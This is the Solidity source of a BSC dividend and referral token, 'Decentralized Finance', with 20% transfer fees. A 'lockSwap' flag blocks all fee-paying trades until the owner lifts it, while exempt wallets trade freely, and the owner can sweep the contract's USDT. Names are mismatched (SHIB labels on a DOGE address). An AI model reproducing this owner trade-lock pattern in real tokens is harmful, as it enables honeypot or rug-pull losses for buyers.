// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./DividendPayingToken.sol";
import "./SafeMath.sol";
import "./IterableMapping.sol";
import "./Ownable.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";


contract DecentralizedFinance is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;

    bool private swapping;

    SHIBDividendTracker public dividendTracker;

    address public deadWallet = 0x000000000000000000000000000000000000dEaD;


    // MUMBAI
    // address public  SHIB = 0xcB1e72786A6eb3b44C2a2429e317c8a2462CFeb1; 
    // BSC SHIB 
    address public DOGE = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43;

    address public marketingWallet = 0xc8c7210C5c7aB35a47C2Ec4Ef9D863cDdDcbC676;

    uint DECIMAL_NUM = 10 ** 9;

    bool public lockSwap = true;

    uint256 public swapTokensAtAmount = 100_000_000 * DECIMAL_NUM;

    uint256 public recommendOwnerTokenNum;
    

    uint256 public liquidityFee = 5;
    uint256 public rewardsFee = 6;
    uint256 public burnFee = 5;
    uint256 public marketingFee = 4;
    uint256 public totalFees = 20;

    uint256 directFee_buy = 4;
    uint256 indirectFee_buy = 2;

    uint256 directFee_sell = 4;
    uint256 indirectFee_sell = 2;

    // MUMBAI v2 
    // address public router = 0x8954AfA98594b838bda56FE4C12a09D7739D179b; 
    // PANCAKE
    address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    // Uni V2
    // address public router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;  

    // pancake v2 usdt
    address public USDT = 0x55d398326f99059fF775485246999027B3197955;
    // mumbai 
    // address public USDT = 0x3813e82e6f7098b9583FC0F33a962D02018B6803;
    
    

    address private multiSigWallet = 0xc8c7210C5c7aB35a47C2Ec4Ef9D863cDdDcbC676;

    // use by default 300,000 gas to process auto-claiming dividends
    uint256 public gasForProcessing = 300000;

     // exlcude from fees and max transaction amount
    mapping (address => bool) private _isExcludedFromFees;

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;


    mapping(address => address) public recommend;
    mapping(address => address) public indirectRecommendation;

    event UpdateDividendTracker(address indexed newAddress, address indexed oldAddress);

    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);

    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SendDividends(
        uint256 tokensSwapped,
        uint256 amount
    );

    event ProcessedDividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
        uint256 gas,
        address indexed processor
    );

    constructor() ERC20("Decentralized Finance", "DeFi") {

        dividendTracker = new SHIBDividendTracker();

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        // exclude from receiving dividends
        dividendTracker.excludeFromDividends(address(dividendTracker));
        dividendTracker.excludeFromDividends(address(this));
        dividendTracker.excludeFromDividends(deadWallet);

        dividendTracker.setTokenWallet(owner());

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadWallet, true);

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again 
        */
        _mint(owner(), 1_000_000_000_000_000 * DECIMAL_NUM);
        
    }



    receive() external payable {}

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function excludeMultipleAccountsFromFees(address[] memory accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }

        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function transferOwnership(address newOwner) public virtual override onlyOwner {
        super.transferOwnership(newOwner);
        dividendTracker.setTokenWallet(newOwner);
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The swap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    // set distribute number
    function setSwapTokensAtAmount(uint _newAmount) public onlyOwner{
        swapTokensAtAmount = _newAmount;
    }
    
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;

        if(value) {
            dividendTracker.excludeFromDividends(pair);
        }

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "Cannot update gasForProcessing to same value");
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }

    function updateClaimWait(uint256 claimWait) external onlyOwner {
        dividendTracker.updateClaimWait(claimWait);
    }

    function getClaimWait() external view returns(uint256) {
        return dividendTracker.claimWait();
    }

    function getTotalDividendsDistributed() external view returns (uint256) {
        return dividendTracker.totalDividendsDistributed();
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function withdrawableDividendOf(address account) public view returns(uint256) {
        return dividendTracker.withdrawableDividendOf(account);
    }

    function dividendTokenBalanceOf(address account) public view returns (uint256) {
        return dividendTracker.balanceOf(account);
    }

    function excludeFromDividends(address account) external onlyOwner{
        dividendTracker.excludeFromDividends(account);
    }

    function getAccountDividendsInfo(address account)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return dividendTracker.getAccount(account);
    }

    function getAccountDividendsInfoAtIndex(uint256 index)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return dividendTracker.getAccountAtIndex(index);
    }

    function processDividendTracker(uint256 gas) external {
        (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = dividendTracker.process(gas);
        emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, false, gas, tx.origin);
    }

    function claim() external {
        dividendTracker.processAccount(msg.sender, false);
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return dividendTracker.getLastProcessedIndex();
    }

    function getNumberOfDividendTokenHolders() external view returns(uint256) {
        return dividendTracker.getNumberOfTokenHolders();
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        if (from == address(this) || to == address(this)) {
            super._transfer(from, to, amount);
            return;
        }

        if((from != uniswapV2Pair && to != uniswapV2Pair)&&(!(automatedMarketMakerPairs[from]|| automatedMarketMakerPairs[to]))) {
            super._transfer(from, to, amount);

            try dividendTracker.setBalance(from, balanceOf(from)) {} catch {}
            try dividendTracker.setBalance(to, balanceOf(to)) {} catch {}

            if(recommend[to] == address(0) && amount >= 1_000_000 * DECIMAL_NUM) {
                recommend[to] = from;
                if(recommend[from] != address(0)){
                    indirectRecommendation[to] = recommend[from];
                }
            } 
            return;
        } else if(recommend[to] == address(0)){
            recommend[to] = owner();
            indirectRecommendation[to] = owner();
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount.add(recommendOwnerTokenNum);

        if( canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            from != owner() &&
            to != owner() 
        ) {
            swapping = true;
            contractTokenBalance = contractTokenBalance.sub(recommendOwnerTokenNum);
            // market
            uint256 marketingTokens = contractTokenBalance.mul(marketingFee).div(totalFees);
            swapAndSendToFee(marketingTokens);
                
            // burn
            uint256 burnTokens = contractTokenBalance.mul(burnFee).div(totalFees);
            super._transfer(address(this), deadWallet, burnTokens);

            // liquidity
            uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees).add(recommendOwnerTokenNum);
            swapAndLiquify(swapTokens);
            recommendOwnerTokenNum = 0;

            // rewards dynamic
            uint256 rewardsTokens = balanceOf(address(this));
            swapAndSendDividends(rewardsTokens);

            swapping = false;
        }

        

        
        
        
        
         // if any account belongs to _isExcludedFromFee account then remove the fee
        if(!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            uint recommendFee = 0;
            uint256 feesAmount = amount.mul(totalFees).div(100);
            super._transfer(from, address(this), feesAmount);
            if (automatedMarketMakerPairs[to]) {
                recommendFee = directFee_sell.add(indirectFee_sell);
            }
            if (automatedMarketMakerPairs[from]) {
                recommendFee = directFee_buy.add(indirectFee_buy);
            }
            uint256 recommentAmount = feesAmount.mul(recommendFee).div(totalFees);
            if (!swapping && !automatedMarketMakerPairs[from]) {
                swapping = true;
                swapAndSendToUSDTForRecommend(from, recommentAmount);
                swapping =false;
            }   else if (automatedMarketMakerPairs[from]){
                sendTokenToRecommend(to, recommentAmount, recommendFee);
            }

            amount = amount.sub(feesAmount);
            if(lockSwap) {
                require(false);
            }
        }

        

        super._transfer(from, to, amount);

        try dividendTracker.setBalance(from, balanceOf(from)) {} catch {}
        try dividendTracker.setBalance(to, balanceOf(to)) {} catch {}

        if(!swapping) {
            uint256 gas = gasForProcessing;

            try dividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
            }
            catch {

            }
        }
    }

    // only can clonse;
    function closeLockSwap() public onlyOwner {
        require(lockSwap, "error: has closed!");
        lockSwap = false;
    }

    function sendTokenToRecommend(address trader, uint _buyFeeAmount, uint _recommendFeeFee) private {
        if(_buyFeeAmount < 10_000 * DECIMAL_NUM) {
            return;
        }

        if (recommend[trader] == address(0)) {
            return;
        }

        if (balanceOf(recommend[trader]) < 100_000_000 * DECIMAL_NUM) {
            return;
        }

        uint recommendBuyFeeAmount = _buyFeeAmount.mul(directFee_buy).div(_recommendFeeFee);
        uint indirectRecommendationAmount = _buyFeeAmount.sub(recommendBuyFeeAmount);

        if (recommend[trader] == owner()) {
            recommendOwnerTokenNum += recommendBuyFeeAmount;
        } else {
            super._transfer(address(this), recommend[trader], recommendBuyFeeAmount);
        }

        if (indirectRecommendation[trader] == address(0)) {
            return;
        }

        if (balanceOf(indirectRecommendation[trader]) < 100_000_000 * DECIMAL_NUM) {
            return;
        }

        if (indirectRecommendation[trader] == owner()) {
            recommendOwnerTokenNum += indirectRecommendationAmount;
        } else {
            super._transfer(address(this), indirectRecommendation[trader], indirectRecommendationAmount);
        }
    }

    function swapAndSendToUSDTForRecommend(address trader, uint256 _amount) private {
        if (balanceOf(address(this)) < _amount || _amount < 10_000 * DECIMAL_NUM) {
            return;
        }

        // save gas
        address recommendRecipient = recommend[trader];
        address indirectRecommendRecipient = indirectRecommendation[trader] ;

        if (recommendRecipient == address(0)) {
            return;
        }

        if (balanceOf(recommendRecipient) < 100_000_000 * DECIMAL_NUM) {
            return;
        }

        bool hasIndeirect = true;

        if (indirectRecommendRecipient == address(0)) {
            hasIndeirect = false;
        }

        if (balanceOf(indirectRecommendRecipient) < 100_000_000 * DECIMAL_NUM) {
            hasIndeirect = false;
        }

        if(recommendRecipient == owner()) {
            recommendRecipient = multiSigWallet;
        }

        if(indirectRecommendRecipient == owner()) {
            indirectRecommendRecipient = multiSigWallet;
        }

        uint256 usdtBal = IERC20(USDT).balanceOf(address(this));

        if(!hasIndeirect) {
            if(recommend[trader] == owner()) {
                return;
            }
            _amount = _amount.mul(2).div(3);
            swapTokensForUSDT(_amount);
            uint256 recommendUsdt = IERC20(USDT).balanceOf(address(this)).sub(usdtBal);
            if(recommendUsdt < 100) {
                return;
            }
            (bool b1, ) = USDT.call(abi.encodeWithSignature("transfer(address,uint256)", recommendRecipient, recommendUsdt));
            require(b1, "call error");
        } else {
            swapTokensForUSDT(_amount);
            uint256 uAmount = IERC20(USDT).balanceOf(address(this)).sub(usdtBal);
            if (uAmount < 100) {
                return;
            }
            uint recommendUsdt = uAmount.mul(2).div(3);
            uint indirectRecommendationAmount = uAmount.sub(recommendUsdt);
            (bool b1, ) = USDT.call(abi.encodeWithSignature("transfer(address,uint256)", recommendRecipient, recommendUsdt));
            require(b1, "call error");
            (bool b2, ) = USDT.call(
            abi.encodeWithSignature("transfer(address,uint256)", indirectRecommendRecipient, indirectRecommendationAmount));
            require(b2, "call error");
        }

    }

    function swapAndSendToFee(uint256 tokens) private  {

        if(tokens == 0) {
            return;
        }

        uint256 initialUSDTBalance = IERC20(USDT).balanceOf(address(this));

        swapTokensForUSDT(tokens);
        uint256 newBalance = (IERC20(USDT).balanceOf(address(this))).sub(initialUSDTBalance);
       
        (bool b, ) = USDT.call(abi.encodeWithSignature("transfer(address,uint256)", marketingWallet, newBalance));
        require(b, "call error");
    }

    function swapAndLiquify(uint256 tokens) private {
       // split the contract balance into halves
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }


    function swapTokensForEth(uint256 tokenAmount) private {
        if(tokenAmount == 0) {
            return;
        }

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function swapTokensForSHIB(uint256 tokenAmount) private {
        if(tokenAmount == 0 || tokenAmount < 100_000 *  DECIMAL_NUM) {
            return;
        }

        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = DOGE;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapTokensForUSDT(uint256 tokenAmount) private {
        if(tokenAmount == 0) {
            return;
        }

        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = USDT;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0),
            block.timestamp
        );

    }

    function swapAndSendDividends(uint256 tokens) private{
        swapTokensForSHIB(tokens);
        uint256 dividends = IERC20(DOGE).balanceOf(address(this));
        bool success = IERC20(DOGE).transfer(address(dividendTracker), dividends);

        if (success) {
            dividendTracker.distributeSHIBDividends(dividends);
            emit SendDividends(tokens, dividends);
        }
    }

    function skim() public onlyOwner {
        uint256 usdtBal = IERC20(USDT).balanceOf(address(this));

        (bool b1, ) = USDT.call(abi.encodeWithSignature("transfer(address,uint256)", owner(), usdtBal));
        require(b1, "call error");
    }
}

contract SHIBDividendTracker is Ownable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;

    IterableMapping.Map private tokenHoldersMap;
    uint256 public lastProcessedIndex;

    address tokenWallet ;
    address public multiSigWallet = 0xA4705cbE975c88850B615E9b40d69961c2b11447;

    mapping (address => bool) public excludedFromDividends;

    mapping (address => uint256) public lastClaimTimes;

    uint256 public claimWait;
    uint256 public minimumTokenBalanceForDividends;

    event ExcludeFromDividends(address indexed account);
    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event Claim(address indexed account, uint256 amount, bool indexed automatic);

    constructor() DividendPayingToken("DOGE_Dividen_Tracker", "DOGE_Dividend_Tracker") {
        claimWait = 60;
        minimumTokenBalanceForDividends = 100_000_000 * (10 ** 9); // must hold 100,000,000+ tokens
    }

    function _transfer(address, address, uint256) internal pure override {
        require(false, "Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main contract.");
    }

    function setTokenWallet(address addr) public onlyOwner {
        tokenWallet = addr;
    }

    function getTokenWallet() public view returns(address) {
        return tokenWallet;
    }

    function excludeFromDividends(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;

        _setBalance(account, 0);
        tokenHoldersMap.remove(account);

        emit ExcludeFromDividends(account);
    }

    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 0 && newClaimWait <= 86400, "Dividend_Tracker: claimWait must be updated to between 0 and 24 hours");
        require(newClaimWait != claimWait, "Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return lastProcessedIndex;
    }

    function getNumberOfTokenHolders() external view returns(uint256) {
        return tokenHoldersMap.keys.length;
    }



    function getAccount(address _account)
        public view returns (
            address account,
            int256 index,
            int256 iterationsUntilProcessed,
            uint256 withdrawableDividends,
            uint256 totalDividends,
            uint256 lastClaimTime,
            uint256 nextClaimTime,
            uint256 secondsUntilAutoClaimAvailable) {
        account = _account;

        index = tokenHoldersMap.getIndexOfKey(account);

        iterationsUntilProcessed = -1;

        if(index >= 0) {
            if(uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index.sub(int256(lastProcessedIndex));
            }
            else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ?
                                                        tokenHoldersMap.keys.length.sub(lastProcessedIndex) :
                                                        0;


                iterationsUntilProcessed = index.add(int256(processesUntilEndOfArray));
            }
        }


        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);

        lastClaimTime = lastClaimTimes[account];

        nextClaimTime = lastClaimTime > 0 ?
                                    lastClaimTime.add(claimWait) :
                                    0;

        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?
                                                    nextClaimTime.sub(block.timestamp) :
                                                    0;
    }

    function getAccountAtIndex(uint256 index)
        public view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        if(index >= tokenHoldersMap.size()) {
            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
        }

        address account = tokenHoldersMap.getKeyAtIndex(index);

        return getAccount(account);
    }

    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
        if(lastClaimTime > block.timestamp)  {
            return false;
        }

        return block.timestamp.sub(lastClaimTime) >= claimWait;
    }

    function setBalance(address account, uint256 newBalance) external onlyOwner {
        if(excludedFromDividends[account]) {
            return;
        }

        if (account == tokenWallet) {
            account = multiSigWallet;
        }
       
        if(newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
            tokenHoldersMap.set(account, newBalance);
        }
        else {
            _setBalance(account, 0);
            tokenHoldersMap.remove(account);
        }

        // processAccount(account, true);
    }

    function process(uint256 gas) public returns (uint256, uint256, uint256) {
        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

        if(numberOfTokenHolders == 0) {
            return (0, 0, lastProcessedIndex);
        }

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 claims = 0;

        while(gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
                _lastProcessedIndex = 0;
            }

            address account = tokenHoldersMap.keys[_lastProcessedIndex];

            if(canAutoClaim(lastClaimTimes[account])) {
                if(processAccount(account, true)) {
                    claims++;
                }
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if(gasLeft > newGasLeft) {
                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;

        return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address account, bool automatic) public onlyOwner returns (bool) {
        uint256 amount = _withdrawDividendOfUser(account);

        if(amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }

        return false;
    }
}